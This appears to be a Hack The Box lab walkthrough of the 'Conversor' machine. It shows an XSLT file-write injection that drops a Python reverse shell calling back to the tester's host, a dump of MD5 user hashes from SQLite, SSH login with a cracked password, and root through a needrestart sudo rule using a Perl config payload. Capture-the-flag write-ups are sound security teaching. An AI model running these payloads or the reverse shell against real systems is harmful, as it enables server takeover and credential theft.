---
title: Conversor — HTB
author: Radeel Ahmad
pubDatetime: 2025-10-26T13:00:00Z
tags:
  - hacking
  - HTB
  - XSLT
  - RCE
  - needrestart
description:
  Hack The Box "Conversor" walkthrough — abusing an XSLT file-conversion feature's EXSLT document() extension to write a Python reverse shell to disk, cracking a leaked MD5 password hash for SSH access, and exploiting a NOPASSWD sudo rule on needrestart for root.
---

### Conversor — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Conversor**'.

![](/blog/images/htb/1*R-PV5HpzFIaF1Kbk4AszFg.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ nmap -sC -sV 10.10.11.92
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 13:00 UTC
Nmap scan report for 10.10.11.92
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.26 seconds
```

Update `etc/hosts:`

```
10.10.11.92 conversor.htb
```

![](/blog/images/htb/1*3n_u-B47brwveSMP--tSTQ.png)

A simple registration page allows creating a new account.

![](/blog/images/htb/1*tnaXJu-EpP6n9GlB5a1gNg.png)

After registering and logging in you arrive at the main user interface/dashboard.

![](/blog/images/htb/1*xUUYIQEx97pb61YsxqOZ8A.png)

Based on that description, Conversor is a web-based file conversion application, specifically:

- Type: Web application (file upload and transformation service)
- Purpose: Converts or transforms Nmap XML scan files into a more readable HTML format using XSLT (Extensible Stylesheet Language Transformations).

To verify the workflow, I uploaded a simple test.xml and test.xslt:

**Test.xml**

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat test.xml
<?xml version="1.0" encoding="UTF-8"?>
<report>
  <title>Conversor test</title>
  <host>conversor.htb</host>
  <items>
    <item id="1">alpha</item>
    <item id="2">beta</item>
  </items>
</report>

┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat test.xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="html" encoding="UTF-8"/>
  <xsl:template match="/">
    <html><body><h1>POC: XSLT executed </h1></body></html>
  </xsl:template>
</xsl:stylesheet>
```

After uploading both files and clicking Convert, the application generated a link:

![](/blog/images/htb/1*chyH648vFHu5t1wGkq3mCw.png)

Visiting the generated link displayed the expected output, confirming the file transformation workflow works as intended:

![](/blog/images/htb/1*j58VPBQrhmgYs5xGyT6Wzg.png)

XSLT used to write the Python script, the `script.xml.`

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat script.xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">

  <xsl:template match="/">
    <ptswarm:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.80",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
    </ptswarm:document>
  </xsl:template>
</xsl:stylesheet>
```

After clicking the generated link the Python payload executed and a connection was received:

![](/blog/images/htb/1*O5WKCFodrJwoJKOdLTfanQ.png)

Started a listener and received a reverse shell from the web application user:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.80] from (UNKNOWN) [10.10.11.92] 40906
/bin/sh: 0: can't access tty; job control turned off
$ls
conversor.htb
$cd conversor.htb
$ls
app.py
app.wsgi
instance
__pycache__
scripts
static
templates
uploads
```

Enumerating the webroot revealed the application files and an instance directory containing the SQLite database:

```
$ cd instance
$ ls
users.db
$ sqlite3 users.db
.tales
Error: unknown command or invalid arguments:  "tales". Enter ".help" for help
.tables
files  users
select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|amigo|d94729ce13f4ee6395bfc6f1080cc986
6|asdf|912ec803b2ce49e4a541068d495ab570
7|user|ee11cbb19052e40b07aac0ca060c23ee
8|a|0cc175b9c0f1b6a831c399e269772661
9|test|098f6bcd4621d373cade4e832627b4f6
```

crack the hash

![](/blog/images/htb/1*zNR2qNsRzY8bTrE2ic3Yeg.png)

Logged in as `fismathack` using the cracked password and retrieved the user flag.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ ssh fismathack@conversor.htb
The authenticity of host 'conversor.htb (10.10.11.92)' can't be established.
ED25519 key fingerprint is SHA256:xCQV5IVWuIxtwatNjsFrwT7VS83ttIlDqpHrlnXiHR8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'conversor.htb' (ED25519) to the list of known hosts.
fismathack@conversor.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Oct 27 03:59:54 PM UTC 2025

  System load:  0.12              Processes:             221
  Usage of /:   65.2% of 5.78GB   Users logged in:       1
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.92
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Oct 27 15:59:55 2025 from 10.10.14.80
fismathack@conversor:~$ cat user.txt
b66bf79fe173d****************
```

---

### Privilege Escalation

`sudo -l` showed `fismathack` can run (`/usr/sbin/needrestart`) NOPASSWD as root. That means fismathack can run that binary with full root privileges without a password.

```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
fismathack@conversor:~$ sudo /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```

A file crafted with a single Perl command was placed in a writable directory and provided to `needrestart` through the `-c` (config) option. Since `needrestart` could be run as root without a password, it executed the contents of the file with root privileges, resulting in an interactive root shell.

```
fismathack@conversor:~$ cat > /tmp/exploit.pl << 'EOF'
system("/bin/bash");
EOF
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /tmp/exploit.pl
root@conversor:/home/fismathack# cd /root/
root@conversor:~# cat root.txt
fdec40b36ca5***************
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
